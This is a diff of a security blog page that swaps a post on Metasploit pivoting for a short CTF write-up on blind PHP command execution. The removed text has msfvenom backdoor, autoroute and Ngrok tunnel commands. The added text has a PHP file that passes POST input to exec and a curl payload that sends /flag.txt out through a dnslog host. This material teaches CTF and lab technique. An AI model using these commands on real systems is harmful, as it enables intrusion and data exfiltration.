@@ -4,9 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网穿透, 0x00dream&#39;s blog">
-    <meta name="description" content="1.msf内网穿透msf拿到跳板机的shell后拿到flag1，便进入到meterpreter后渗透，进行内网信息收集——查看靶机上的内网路由地址，然后将其添加到本地代理中进行内网穿透。
-meterpreter&amp;gt; run get_lo">
+    <meta name="keywords" content="dnslog外带RCE, 0x00dream&#39;s blog">
+    <meta name="description" content="一、命令执行不回显，利用dnslog外带1.题目源码&amp;lt;?php
+
+if(isset($_POST[&#39;cmd&#39;])){
+    @exec($_POST[&#39;cmd&#39;],$res,$rc);
+    //echo $rc;
+}else{
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +23,7 @@ meterpreter&amp;gt; run get_lo">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网穿透 | 0x00dream&#39;s blog</title>
+    <title>dnslog外带RCE | 0x00dream&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -290,12 +295,12 @@ meterpreter&amp;gt; run get_lo">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网穿透</h1>
+                    <h1 class="description center-align post-title">dnslog外带RCE</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +416,8 @@ meterpreter&amp;gt; run get_lo">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -427,21 +432,21 @@ meterpreter&amp;gt; run get_lo">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-11-21
+                    2025-05-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-23
+                    2025-05-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    370
+                    46
                 </div>
                 
 
@@ -466,39 +471,21 @@ meterpreter&amp;gt; run get_lo">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-msf内网穿透"><a href="#1-msf内网穿透" class="headerlink" title="1.msf内网穿透"></a>1.msf内网穿透</h2><p>msf拿到跳板机的shell后拿到flag1，便进入到meterpreter后渗透，进行内网信息收集——查看靶机上的内网路由地址，然后将其添加到本地代理中进行内网穿透。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter<span class="token operator">&gt;</span> run get_local_subnets  <span class="token comment"># 获取网络接口</span>
-			run autoroute -p   <span class="token comment">#查看到跳板机能连接到内网中靶机2的路由地址</span>
-			run autoroute -s <span class="token number">192.168</span>.22.0/24   <span class="token comment">#kali添加能连接靶机2的路由地址</span>
-<span class="token comment">#开启本地代理</span>
-use auxiliary/server/socks4a
-<span class="token builtin class-name">set</span> srvport <span class="token number">2222</span>
-exploit
-<span class="token comment">#配置proxychains.conf</span>
-<span class="token function">vim</span> /etc/proxychains.conf
-添加  socks4 <span class="token number">192.168</span>.21.128 <span class="token number">2222</span>
-然后内网穿透代理就设置好了,下一步就可以直接扫内网中其他主机了
-proxychains nmap -sT -Pn <span class="token number">192.168</span>.22.0/24 -p <span class="token number">80</span>  <span class="token comment"># 扫描出靶机2</span>
-漏洞利用之后蚁剑拿到shell,拿到flag2
-然后上传一个正向代理的后门
-msfvenom -p linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">3333</span> -f elf <span class="token operator">&gt;</span> t2.elf  <span class="token comment">#生成正向连接的后门</span>
-然后再继续扫描出靶机2中能连接靶机3的路由地址，并添加到kali上
-再找靶机3上的漏洞进行利用，拿到靶机3的shell
-拿到flag3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h2 id="一、命令执行不回显，利用dnslog外带"><a href="#一、命令执行不回显，利用dnslog外带" class="headerlink" title="一、命令执行不回显，利用dnslog外带"></a>一、命令执行不回显，利用dnslog外带</h2><h3 id="1-题目源码"><a href="#1-题目源码" class="headerlink" title="1.题目源码"></a>1.题目源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<h2 id="2-Ngrok内网穿透"><a href="#2-Ngrok内网穿透" class="headerlink" title="2.Ngrok内网穿透"></a>2.Ngrok内网穿透</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ngrok隧道目录下
-./sunny.exe --server<span class="token operator">=</span>free.idcfengye.com:4443 --key<span class="token operator">=</span><span class="token number">213246308639</span>   <span class="token comment">#开启隧道</span>
-做后门，让靶机反向连接Ngrok服务器
-msfvenom -p linux/x64/meterpreter_reverse_http <span class="token assign-left variable">lhost</span><span class="token operator">=</span>0x00dream.free.idcfengye.com <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">80</span> -f elf <span class="token operator">&gt;</span> houmen.elf
-use exploit/multi/handler
-<span class="token builtin class-name">set</span> payload linux/x64/meterpreter_reverse_http   或  windows/meterpreter/reverse_http
-<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.21.128
-<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>
-exploit
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">,</span><span class="token variable">$rc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//echo $rc;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"It works!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="2-payload"><a href="#2-payload" class="headerlink" title="2.payload"></a>2.payload</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">cmd</span><span class="token operator">=</span>curl <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /flag.txt<span class="token variable">`</span></span>.17anyo.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/2025/05/11/ctf-shua-ti/dnslog-wai-dai-rce/image-20250511141010296.png" alt="image-20250511141010296"></p>
 
                 
             </div>
@@ -525,7 +512,7 @@ exploit
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://0x00dream.github.io/2024/11/21/web-an-quan/nei-wang-chuan-tou/">http://0x00dream.github.io/2024/11/21/web-an-quan/nei-wang-chuan-tou/</a>
+                    <a href="http://0x00dream.github.io/2025/05/11/ctf-shua-ti/dnslog-wai-dai-rce/">http://0x00dream.github.io/2025/05/11/ctf-shua-ti/dnslog-wai-dai-rce/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -563,8 +550,8 @@ exploit
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -740,13 +727,13 @@ exploit
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/">
+                <a href="/2025/05/11/ctf-shua-ti/rce-php-rao-guo/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="SSTI模板注入">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="RCE_php绕过">
                         
-                        <span class="card-title">SSTI模板注入</span>
+                        <span class="card-title">RCE_php绕过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -757,7 +744,7 @@ exploit
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-23
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-11
                         </span>
                         <span class="publish-author">
                             
@@ -770,8 +757,8 @@ exploit
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -785,13 +772,13 @@ exploit
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/11/21/web-an-quan/fan-dan-shell/">
+                <a href="/2025/05/07/ctf-shua-ti/php-qu-fan-rao-guo/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="反弹shell">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="php-取反绕过">
                         
-                        <span class="card-title">反弹shell</span>
+                        <span class="card-title">php-取反绕过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -802,7 +789,7 @@ exploit
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-07
                             </span>
                         <span class="publish-author">
                             
@@ -815,8 +802,8 @@ exploit
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1003,7 +990,7 @@ exploit
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">32.9k</span>
+                        class="white-color">46.7k</span>
             
             
             
